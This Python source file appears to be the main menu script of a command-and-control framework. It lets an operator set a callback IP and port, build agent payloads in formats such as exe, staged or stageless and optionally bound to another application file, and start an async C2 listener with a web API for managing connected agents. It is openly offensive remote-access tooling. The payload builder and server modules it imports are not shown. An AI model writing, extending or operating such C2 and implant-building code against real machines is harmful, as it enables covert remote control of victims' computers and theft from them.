import os
import threading
import uvicorn
from colorama import Fore, init

from agent.builder.builder import builder
from api.main import app, manager
from cli import shell as shclass
from cli.options import options
from core.crypto.encrypter import *
from core.utils.paths import get_project_path

ip = system.getdata("recent_ip", "user_data") or "0.0.0.0"
port = system.getdata("recent_port", "user_data") or 4444


def generateConf():
    generate()


def selectIP():
    global ip
    system.clear_screen()
    system.printheader()
    system.printMenuOptions(ip, port)
    ip = system.input(1)
    system.setData("recent_ip", ip, "user_data")


def selectPort():
    global port
    system.clear_screen()
    system.printheader()
    system.printMenuOptions(ip, port)
    port = int(system.input(2))
    system.setData("recent_port", port, "user_data")


def getPayloadOption():
    while True:
        system.clear_screen()
        system.printheader()
        system.printBuildOptions(2)
        command = system.input(6).strip("")

        if command in ["1", "2", "9"]:
            break
    return command


def getAppOption():
    location = "null"
    while True:
        system.clear_screen()
        system.printheader()
        system.printBuildOptions(3)
        command = system.input(5).strip("")

        if command == "1":
            location = system.input(5)
            if os.path.exists(location):
                break
            else:
                print(Fore.LIGHTRED_EX + "[!] Error: File does not exist")
                input("OK")
                continue
        elif command in ["2", "9"]:
            break
    return location


def build():
    if not ip or not port:
        print(Fore.LIGHTRED_EX + "[!] Warning: Please select IP and PORT")
        input("OK")
        return
    while True:
        system.clear_screen()
        system.printheader()
        system.printBuildOptions(1)
        command = system.input(3).strip("")

        if command == "9":
            break

        try:
            b_format = options.build_formats.get(command, "exe")
        except Exception:
            b_format = "exe"

        payload_option = getPayloadOption()
        app_option = getAppOption()
        if payload_option == "2":
            builder.build(type=b_format, ip=ip, port=int(port), app=app_option)
            break
        elif payload_option == "1":
            builder.build(
                type=b_format,
                ip=ip,
                port=int(port),
                app=app_option,
                isstaged=True,
            )
            break


def start_server_and_api():
    """Runs FastAPI and Async TCP C2 Server in the background."""
    manager.address = f"{ip}:{port}"
    uvicorn.run(app, host="0.0.0.0", port=8080, log_level="warning")


def listen():
    """Launches C2 listener and REST API server asynchronously."""
    if not ip or not port:
        print(Fore.LIGHTRED_EX + "[!] Warning: Please select IP and PORT")
        input("OK")
        return

    system.clear_screen()
    system.printheader()
    print(Fore.LIGHTCYAN_EX + f"[+] Starting Async C2 Server on {ip}:{port}...")
    print(
        Fore.LIGHTCYAN_EX
        + "[+] Starting Web API on http://0.0.0.0:8080 (Docs: http://localhost:8080/docs)..."
    )

    api_thread = threading.Thread(target=start_server_and_api, daemon=True)
    api_thread.start()

    print(Fore.LIGHTGREEN_EX + "\n[+] C2 & API Service running in background!")
    print(
        Fore.LIGHTYELLOW_EX
        + "[!] Manage agents via Web/API endpoints or CLI session manager."
    )
    input("\nPress ENTER to return to main menu...")


menu_options = {
    "1": build,
    "2": listen,
    "3": selectIP,
    "4": selectPort,
    "5": generateConf,
}

init(autoreset=True)


def main():
    system.clear_screen()
    system.printDisclaimer()
    while True:
        system.clear_screen()
        system.printheader()
        system.printMenuOptions(ip, port)
        command = system.input(0)

        if command == "q":
            break
        func = menu_options.get(command)
        if func:
            func()
        else:
            system.clear_screen()


if __name__ == "__main__":
    main()
